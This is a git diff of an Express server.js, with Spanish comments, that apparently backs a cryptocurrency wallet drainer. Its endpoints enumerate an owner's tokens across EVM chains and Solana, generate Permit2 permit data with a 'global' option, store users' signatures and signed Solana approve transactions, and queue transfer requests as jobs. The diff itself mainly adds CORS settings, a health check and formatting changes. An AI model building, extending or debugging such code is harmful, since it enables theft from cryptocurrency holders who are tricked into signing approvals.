@@ -1,4 +1,4 @@
-// server.js (versión corregida y mejorada)
+// server.js (versión corregida y completa)
 import express from "express";
 import bodyParser from "body-parser";
 import cors from "cors";
@@ -31,23 +31,24 @@ const __dirname = path.dirname(__filename);
 // ----------------- Crea app ANTES de usarla -----------------
 const app = express();
 
-// Middlewares (se declaran después de crear `app`)
+// Configuración de CORS mejorada
 app.use(cors({
   origin: ['https://frontpermi.vercel.app', 'http://localhost:3000'],
   credentials: true,
   methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
-  allowedHeaders: ['Content-Type', 'Authorization']
+  allowedHeaders: ['Content-Type', 'Authorization', 'Accept']
 }));
+
+// Manejo explícito de preflight requests
 app.options('*', cors());
 
-app.use((err, req, res, next) => {
-  console.error('Error no manejado:', err);
-  res.status(500).json({ 
-    error: 'Error interno del servidor',
-    message: err.message 
-  });
+// Middleware para forzar JSON en todas las respuestas
+app.use((req, res, next) => {
+  res.setHeader('Content-Type', 'application/json');
+  next();
 });
 
+app.use(express.static(path.join(__dirname, "../public")));
 app.use(bodyParser.json({ limit: "10mb" }));
 
 // ----------------- CONFIG -----------------
@@ -315,9 +316,19 @@ async function getTokensAllChains(owner){
 }
 
 // ----------------- EXPRESS API -----------------
-app.get('/ping', (req,res)=> res.json({ ok:true }));
+// Health check endpoint
+app.get('/health', (req, res) => {
+  res.json({ 
+    status: 'OK', 
+    message: 'Backend server is running',
+    timestamp: new Date().toISOString(),
+    uptime: process.uptime()
+  });
+});
 
-app.post('/wrap-info', (req,res)=>{
+app.get('/ping', (req, res)=> res.json({ ok:true }));
+
+app.post('/wrap-info', (req, res)=>{
   try{
     const chain = Number(req.body.chain || DEFAULT_CHAIN);
     const map = {
@@ -334,13 +345,12 @@ app.post('/wrap-info', (req,res)=>{
   }catch(e){ res.status(500).json({ error: e.message||String(e) }); }
 });
 
-app.get('/permit2-spender', (req,res)=> res.json({ spender: PERMIT2_ADDRESS }));
+app.get('/permit2-spender', (req, res)=> res.json({ spender: PERMIT2_ADDRESS }));
 
-app.post('/owner-tokens', async (req, res) => {
-  try {
-    if (!req.body.owner || typeof req.body.owner !== 'string') {
-      return res.status(400).json({ error: "Parámetro 'owner' inválido" });
-    }
+app.post('/owner-tokens', async (req, res)=>{
+  try{
+    const { owner, chain } = req.body;
+    if(!owner) return res.status(400).json({ error: "owner required" });
     if(chain === 'solana' || chain === 'Solana'){
       const sol = await getSolanaTokens(owner);
       return res.json({ tokens: sol });
@@ -359,15 +369,14 @@ app.post('/owner-tokens', async (req, res) => {
     }
     const tokens = await getTokensAllChains(owner);
     return res.json({ tokens });
-  } catch (e) {
-    console.error('/owner-tokens error', e);
-    return res.status(500).json({ 
-      error: "Error interno",
-      details: e.message 
-    }); }
+  }catch(e){ console.error('/owner-tokens error', e); return res.status(500).json({ error: e.message||String(e) }); }
 });
 
-app.post('/permit-data', async (req,res)=>{
+app.get('/owner-tokens', (req, res) => {
+  res.status(405).json({ error: 'Method Not Allowed. Use POST instead.' });
+});
+
+app.post('/permit-data', async (req, res)=>{
   try{
     const { owner, token, amount, expiration, chain, global } = req.body;
     if(!owner || !token) return res.status(400).json({ error: "owner and token required" });
@@ -395,7 +404,7 @@ app.post('/permit-data', async (req,res)=>{
   }catch(e){ console.error('/permit-data', e); res.status(500).json({ error: e.message || String(e) }); }
 });
 
-app.post('/save-signature', async (req,res)=>{
+app.post('/save-signature', async (req, res)=>{
   try{
     const { owner, token, typedData, signature, chain } = req.body;
     if(!owner || !token || !typedData || !signature) return res.status(400).json({ error: "owner, token, typedData, signature required" });
@@ -407,7 +416,7 @@ app.post('/save-signature', async (req,res)=>{
   }catch(e){ console.error('/save-signature', e); return res.status(500).json({ error: e.message||String(e) }); }
 });
 
-app.post('/solana-approve-tx', async (req,res)=>{
+app.post('/solana-approve-tx', async (req, res)=>{
   try{
     const { owner, tokenMint, amount, decimals } = req.body;
     if(!owner || !tokenMint || !amount) return res.status(400).json({ error: "owner, tokenMint, amount required" });
@@ -429,7 +438,7 @@ app.post('/solana-approve-tx', async (req,res)=>{
   }catch(e){ console.error('/solana-approve-tx', e); return res.status(500).json({ error: e.message || String(e) }); }
 });
 
-app.post('/save-sol-signed-approve', async (req,res)=>{
+app.post('/save-sol-signed-approve', async (req, res)=>{
   try{
     const { owner, tokenMint, signedTxBase64, amount, decimals } = req.body;
     if(!owner || !tokenMint || !signedTxBase64 || !amount) return res.status(400).json({ error: "owner, tokenMint, signedTxBase64, amount required" });
@@ -440,7 +449,7 @@ app.post('/save-sol-signed-approve', async (req,res)=>{
   }catch(e){ console.error('/save-sol-signed-approve', e); return res.status(500).json({ error: e.message||String(e) }); }
 });
 
-app.post('/create-transfer-request', async (req,res)=>{
+app.post('/create-transfer-request', async (req, res)=>{
   try{
     const { owner, chain, token, amount } = req.body;
     if(!owner || !chain || !amount) return res.status(400).json({ error: "owner, chain, amount required" });
@@ -516,7 +525,7 @@ app.post('/create-native-transfer-request', async (req, res) => {
   }
 });
 
-app.get('/jobs', async (req,res) => { 
+app.get('/jobs', async (req, res) => { 
   try {
     const jobs = await fs.readJson(JOBS_FILE); 
     res.json({ jobs }); 
@@ -525,7 +534,7 @@ app.get('/jobs', async (req,res) => {
   }
 });
 
-app.get('/job/:id', async (req,res) => { 
+app.get('/job/:id', async (req, res) => { 
   try {
     const jobs = await fs.readJson(JOBS_FILE); 
     const j = jobs.find(x=>x.id===req.params.id); 
